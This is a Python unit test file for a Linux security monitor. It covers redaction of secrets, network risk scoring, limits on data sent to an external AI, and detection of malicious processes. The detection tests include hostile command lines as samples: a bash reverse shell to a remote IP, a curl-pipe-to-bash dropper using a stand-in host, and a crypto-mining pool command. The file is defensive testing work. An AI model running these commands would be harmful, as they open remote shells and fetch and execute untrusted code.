#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2024 linmon contributors
"""安全相关单元测试：脱敏、端口风险、地理风险、外发最小化。"""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from unittest import mock

from modules.ai_analyzer import redact_text, AIAnalyzer
from modules.geo_locator import classify_port, is_private_ip, is_valid_public_ip
from modules.net_monitor import _assess_connection_risk, configure_geo_risk
from modules.proc_monitor import _detect_high_risk, _exe_is_deleted


class TestRedact(unittest.TestCase):
    def test_bearer_token(self):
        self.assertNotIn('SECRET123', redact_text('Authorization: Bearer SECRET123'))

    def test_mysql_password(self):
        self.assertNotIn('p@ssw0rd', redact_text('mysql -uprod -pp@ssw0rd db'))

    def test_uri_creds(self):
        self.assertNotIn('passw0rd', redact_text('postgres://user:passw0rd@db:5432/a'))

    def test_key_value(self):
        self.assertNotIn('sk-123', redact_text('token=sk-1234567890abcdef'))

    def test_plain_text_untouched(self):
        self.assertEqual(redact_text('nginx worker process'), 'nginx worker process')


class TestIpClassification(unittest.TestCase):
    def test_private(self):
        self.assertTrue(is_private_ip('192.168.1.5'))
        self.assertTrue(is_private_ip('10.0.0.1'))
        self.assertTrue(is_private_ip('127.0.0.1'))

    def test_public(self):
        self.assertFalse(is_private_ip('8.8.8.8'))
        self.assertTrue(is_valid_public_ip('1.1.1.1'))
        self.assertFalse(is_valid_public_ip('192.168.0.1'))


class TestPortRisk(unittest.TestCase):
    def test_backdoor_port(self):
        level, reasons = _assess_connection_risk({
            'remote_ip': '1.2.3.4', 'remote_port': 4444, 'local_port': 1,
            'data_type_info': ('Metasploit', 'high'), 'direction': 'outbound',
            'process': '', 'state': 'ESTABLISHED', 'geo': {'geo_str': '未知'},
        })
        self.assertEqual(level, 'high')
        self.assertTrue(any('后门' in r for r in reasons))

    def test_normal_https_low(self):
        level, _ = _assess_connection_risk({
            'remote_ip': '1.2.3.4', 'remote_port': 443, 'local_port': 1,
            'data_type_info': ('HTTPS', 'low'), 'direction': 'outbound',
            'process': '', 'state': 'ESTABLISHED', 'geo': {'geo_str': '未知'},
        })
        self.assertEqual(level, 'low')


class TestGeoRisk(unittest.TestCase):
    def tearDown(self):
        configure_geo_risk(False, [])

    def test_geo_risk_enabled(self):
        configure_geo_risk(True, ['美国'])
        level, reasons = _assess_connection_risk({
            'remote_ip': '1.2.3.4', 'remote_port': 443, 'local_port': 1,
            'data_type_info': ('HTTPS', 'low'), 'direction': 'outbound',
            'process': '', 'state': 'ESTABLISHED',
            'geo': {'geo_str': '美国 加利福尼亚', 'country': '美国'},
        })
        self.assertTrue(any('高风险地区' in r for r in reasons))

    def test_geo_risk_disabled_by_default(self):
        # 默认关闭，不应因地区产生风险
        level, reasons = _assess_connection_risk({
            'remote_ip': '1.2.3.4', 'remote_port': 443, 'local_port': 1,
            'data_type_info': ('HTTPS', 'low'), 'direction': 'outbound',
            'process': '', 'state': 'ESTABLISHED',
            'geo': {'geo_str': '美国 加利福尼亚', 'country': '美国'},
        })
        self.assertFalse(any('高风险地区' in r for r in reasons))


class TestExternalSendMinimization(unittest.TestCase):
    def test_offline_blocks_send(self):
        a = AIAnalyzer()
        a.config['allow_external_ai'] = False
        self.assertFalse(a.is_external_allowed())
        r = a.generate_security_report([{'is_risky': True, 'risk_level': 'high', 'name': 'x', 'pid': 1}], [])
        self.assertTrue(r.get('offline'))

    def test_preview_summarizes_what_is_sent(self):
        a = AIAnalyzer()
        a.config['allow_external_ai'] = True
        a.config['send_internal_ips'] = False
        pv = a.preview_send(
            [{'is_risky': True, 'risk_level': 'high', 'name': 'x', 'pid': 1}],
            [{'risk_level': 'high', 'remote_ip': '1.2.3.4', 'remote_port': 4444}],
        )
        self.assertTrue(pv['allowed'])
        self.assertTrue(pv['will_send'])
        self.assertIn('命令行(已脱敏)', pv['fields'])
        self.assertNotIn('本机内网IP', pv['fields'])

    def test_prompt_hides_internal_ip_and_redacts_cmdline(self):
        a = AIAnalyzer()
        a.config['send_internal_ips'] = False
        a.config['redact_sensitive'] = True
        p = a._build_connection_prompt({
            'protocol': 'tcp', 'state': 'EST', 'direction': 'outbound',
            'local_ip': '192.168.1.5', 'local_port': 4444,
            'remote_ip': '1.2.3.4', 'remote_port': 443, 'data_type': 'HTTPS',
            'remote_os': 'Linux', 'geo': {'geo_str': '中国', 'lng': 1, 'lat': 2},
            'process': 'bash', 'pid': 9, 'process_cmdline': 'mysql -pp@ssw0rd',
            'process_user': 'alice', 'age_str': '1m', 'timer_info': '',
            'bytes_sent_str': '1B', 'bytes_recv_str': '1B',
            'frequency': {'frequency_desc': ''}, 'risk_reasons_str': '', 'risk_level': 'high',
        })
        self.assertNotIn('192.168.1.5', p)
        self.assertNotIn('p@ssw0rd', p)


class TestMalwareDetection(unittest.TestCase):
    """多维恶意特征研判（名称 + 路径 + 命令行 + 哈希）测试。"""

    def _base(self, **kw):
        p = {
            'pid': 1234, 'ppid': 100, 'name': 'x', 'exe': '/usr/bin/x',
            'cmdline': '', 'username': 'alice', 'uid': 1000,
            'listening_ports': set(), 'network_connections': [],
            'category': 'unknown',
        }
        p.update(kw)
        return p

    def test_name_match_high(self):
        p = self._base(name='xmrig', category='malware')
        risky, level, reasons = _detect_high_risk(p)
        self.assertTrue(risky)
        self.assertEqual(level, 'high')
        self.assertTrue(any('恶意' in r for r in reasons))

    def test_reverse_shell_high(self):
        p = self._base(name='bash', cmdline='bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')
        risky, level, reasons = _detect_high_risk(p)
        self.assertTrue(risky)
        self.assertEqual(level, 'high')
        self.assertTrue(any('反向' in r for r in reasons))

    def test_dropper_high(self):
        p = self._base(name='sh', cmdline='curl http://evil.sh | bash')
        risky, level, reasons = _detect_high_risk(p)
        self.assertTrue(risky)
        self.assertEqual(level, 'high')

    def test_mining_cmdline_high(self):
        p = self._base(name='python3', cmdline='./run --pool stratum+tcp://xmr.pool:3333 -u wallet')
        risky, level, reasons = _detect_high_risk(p)
        self.assertTrue(risky)
        self.assertEqual(level, 'high')
        self.assertTrue(any('矿池' in r for r in reasons))

    def test_root_exe_unreadable_flagged_when_scanner_root(self):
        # 扫描器本身为 root 时，root 进程 exe 不可读才是异常（降低漏报）
        p = self._base(name='weirdproc', username='root', uid=0, exe='', cmdline='')
        with mock.patch('modules.proc_monitor.os.geteuid', return_value=0):
            risky, level, reasons = _detect_high_risk(p)
        self.assertTrue(risky)
        self.assertTrue(any('root进程' in r for r in reasons))

    def test_root_exe_unreadable_not_flagged_when_nonroot(self):
        # 非特权扫描器下，root 进程 exe 不可读多为权限不足，不应误报
        p = self._base(name='weirdproc', username='root', uid=0, exe='', cmdline='')
        with mock.patch('modules.proc_monitor.os.geteuid', return_value=1000), \
                mock.patch('modules.proc_monitor._exe_is_deleted', return_value=False):
            risky, level, reasons = _detect_high_risk(p)
        self.assertFalse(risky)

    def test_deleted_binary_flagged(self):
        # 真正被删除却仍在运行的二进制：高置信，与扫描器权限无关
        p = self._base(name='weirdproc', username='root', uid=0, exe='', cmdline='')
        with mock.patch('modules.proc_monitor._exe_is_deleted', return_value=True):
            risky, level, reasons = _detect_high_risk(p)
        self.assertTrue(risky)
        self.assertTrue(any('已被删除' in r for r in reasons))

    def test_exe_is_deleted_helper(self):
        with mock.patch('modules.proc_monitor.os.readlink', return_value='/tmp/evil (deleted)'):
            self.assertTrue(_exe_is_deleted(1234))
        with mock.patch('modules.proc_monitor.os.readlink', return_value='/usr/bin/ok'):
            self.assertFalse(_exe_is_deleted(1234))
        with mock.patch('modules.proc_monitor.os.readlink', side_effect=OSError):
            self.assertFalse(_exe_is_deleted(1234))

    def test_normal_process_not_flagged(self):
        p = self._base(name='nginx', exe='/usr/sbin/nginx', username='www-data')
        risky, level, reasons = _detect_high_risk(p)
        self.assertFalse(risky)


if __name__ == '__main__':
    unittest.main(verbosity=2)
